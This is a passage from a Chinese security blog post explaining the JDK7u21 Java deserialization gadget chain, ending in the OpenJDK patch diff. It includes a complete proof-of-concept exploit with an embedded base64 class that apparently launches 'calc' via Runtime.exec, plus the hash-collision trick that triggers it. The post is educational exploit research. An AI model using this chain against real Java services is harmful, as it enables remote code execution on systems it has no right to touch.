class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们不难想到如果构造一个 <code>AnnotationInvocationHandler</code> 使得其 <code>type</code> 为 <code>Templates.class</code> 然后将 <code>TemplatesImpl</code> 对象传入便会调用它的 <code>getOutputProperties</code> 方法实现恶意字节码加载。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而 <code>equalsImpl</code> 方法可以通过 <code>AnnotationInvocationHandler#invoke</code> 方法调用。也就是说如果我们使用 <code>AnnotationInvocationHandler#invoke</code> 代理一个类，然后调用这个类的 <code>equals</code> 方法就可以触发 <code>AnnotationInvocationHandler#equalsImpl</code> 方法调用，且传入的参数是 <code>equals</code> 的参数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>HashSet</code> 内部实际上是通过 <code>HashMap</code> 来实现的，我们存入 <code>HashSet</code> 中的数据实际上是存入内部成员 <code>private transient HashMap&lt;E,Object&gt; map;</code> 的键中，而对应的值设为一个 <code>Object</code> 类型的对象来占位（<del>真够懒的</del>）。因此在 <code>HashSet#readObject</code> 函数中我们会把 <code>HashSet</code> 存储的元素逐个加到 <code>HashMap</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in HashMap capacity and load factor and create backing HashMap</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">    map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in size</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>HashMap</code> 中会计算哈希值找到对应的桶然后逐个比较去重，最后放到 <code>HashMap</code> 中。这里涉及到了 <code>equals</code> 方法的调用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       </span><br><span class="line">       ...</span><br><span class="line">       </span><br><span class="line">       h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">       <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">       <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">       h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">       <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">       <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">       <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">       <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">           Object k;</span><br><span class="line">           <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">               <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">               e.value = value;</span><br><span class="line">               e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">               <span class="keyword">return</span> oldValue;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       modCount++;</span><br><span class="line">       addEntry(hash, key, value, i);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>因此如果我们在 <code>HashSet</code> 中放一个 <code>TemplatesImpl</code> 对象再放一个 <code>AnnotationInvocationHandler</code> 代理的对象，并且恰巧这两个对象的哈希值相等且 <code>AnnotationInvocationHandler</code> 代理的对象是后加入的，那么调用 <code>equals</code> 方法就会触发前面介绍的利用链。</p>
<p>所以现在的问题是如何构造一个 <code>AnnotationInvocationHandler</code> 代理的对象使得其哈希值与 <code>TemplatesImpl</code> 对象相等。</p>
<p>由于 <code>TemplatesImpl</code> 没有显式实现 <code>hashCode()</code> 方法，因此它将继承自 <code>java.lang.Object</code> 类中的默认实现。在这种情况下，调用 <code>hashCode()</code> 方法返回的是该对象的内存地址经过哈希计算后得到的一个整数值。也就是说这个哈希值我们不可控制。</p>
<p>但是我们可以想办法构造一个 <code>AnnotationInvocationHandler</code> 代理的对象使得它的哈希值总是与 <code>TemplatesImpl</code> 对象的哈希值相等。 </p>
<p><code>AnnotationInvocationHandler</code> 代理的对象的 <code>hashCode</code> 方法实际上调用的是 <code>AnnotationInvocationHandler#invoke</code> 进而会调用到 <code>AnnotationInvocationHandler#hashCodeImpl</code>。</p>
<p>这个方法会遍历 <code>memberValues</code> 这个 <code>Map</code> 中的每个 <code>key</code> 和 <code>value</code>，计算每个 <code>(127 * key.hashCode()) ^ value.hashCode()</code> 并求和。因此我们只要让 <code>value</code> 为<strong>同一个</strong> <code>TemplatesImpl</code> 且 <code>key</code> 的哈希值为 0 即可。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hashCodeImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;</span><br><span class="line">        result += (<span class="number">127</span> * e.getKey().hashCode()) ^</span><br><span class="line">            memberValueHashCode(e.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>网上通常的做法是枚举十六进制数字对应的字符串，最终得到 <code>f5a5a608</code> 这个字符串。但实际上根据字符串的哈希计算方式很容易就构造出 <code>\0</code> 这一字符串。</p>
<p>poc 如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDK7u21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(<span class="string">&quot;yv66vgAAADMANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACBMY29tL2V4YW1wbGUvSGVsbG9UZW1wbGF0ZXNJbXBsOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAvAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEAF0hlbGxvVGVtcGxhdGVzSW1wbC5qYXZhDAAKAAsHADAMADEAMgEABGNhbGMMADMANAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwACgA1AQAeY29tL2V4YW1wbGUvSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAALAA4AAAAMAAEAAAAFAA8AEAAAAAEAEQASAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAXAA4AAAAgAAMAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAFQAWAAIAFwAAAAQAAQAYAAEAEQAZAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAcAA4AAAAqAAQAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAGgAbAAIAAAABABwAHQADABcAAAAEAAEAGAAIAB4ACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAADgAJABEADAAPAA0AEAAWABIADgAAAAwAAQANAAkAHwAgAAAAIQAAAAcAAkwHACIJAAEAIwAAAAIAJA==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;\0&quot;</span>, <span class="string">&quot;sky123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span>  clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Serializable</span> <span class="variable">proxy</span> <span class="operator">=</span> (Serializable) Proxy.newProxyInstance(Serializable.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Serializable.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;\0&quot;</span>, templates);</span><br><span class="line">        System.out.println(proxy.hashCode());</span><br><span class="line">        System.out.println(templates.hashCode());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(set);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">defineClass:136, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:339, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:376, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:410, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:431, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">invoke:601, Method (java.lang.reflect)</span><br><span class="line">equalsImpl:197, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke:59, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">equals:-1, $Proxy1 (com.sun.proxy)</span><br><span class="line">put:475, HashMap (java.util)</span><br><span class="line">readObject:309, HashSet (java.util)</span><br><span class="line">...</span><br><span class="line">main:48, JDK7u21 (com.example)</span><br></pre></td></tr></table></figure></div>

<p> <a class="link"   target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/0ca6cbe3f350" >https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/0ca6cbe3f350<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java Fri Mar 22 15:40:16 2013 -0400</span></span><br><span class="line"><span class="comment">+++ b/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java Mon Mar 25 12:41:55 2013 +0400</span></span><br><span class="line"><span class="meta">@@ -1,5 +1,5 @@</span></span><br><span class="line"> /*</span><br><span class="line"><span class="deletion">- * Copyright (c) 2003, 2011, Oracle and/or its affiliates. All rights reserved.</span></span><br><span class="line"><span class="addition">+ * Copyright (c) 2003, 2013, Oracle and/or its affiliates. All rights reserved.</span></span><br><span class="line">  * DO NOT ALTER OR REMOVE COPYRIGHT NOTICES OR THIS FILE HEADER.</span><br><span class="line">  *</span><br><span class="line">  * This code is free software; you can redistribute it and/or modify it</span><br><span class="line"><span class="meta">@@ -337,12 +337,15 @@</span></span><br><span class="line">         try &#123;</span><br><span class="line">             annotationType = AnnotationType.getInstance(type);</span><br><span class="line">         &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line"><span class="deletion">-            // Class is no longer an annotation type; all bets are off</span></span><br><span class="line"><span class="deletion">-            return;</span></span><br><span class="line"><span class="addition">+            // Class is no longer an annotation type; time to punch out</span></span><br><span class="line"><span class="addition">+            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        // If there are annotation members without values, that</span></span><br><span class="line"><span class="addition">+        // situation is handled by the invoke method.</span></span><br><span class="line">         for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">             String name = memberValue.getKey();</span><br><span class="line">             Class&lt;?&gt; memberType = memberTypes.get(name);</span><br></pre></td></tr></table></figure></div>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Java 反序列化</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-09-09 00:44:06</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-09-08 10:04:50
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/09/09/Java 反序列化/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/java-web/">#java web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/09/09/Java%20FastJson/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java FastJson</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/08/25/Java%20RMI%20&amp;%20JNDI/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java RMI &amp; JNDI</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Java 反序列化</div>
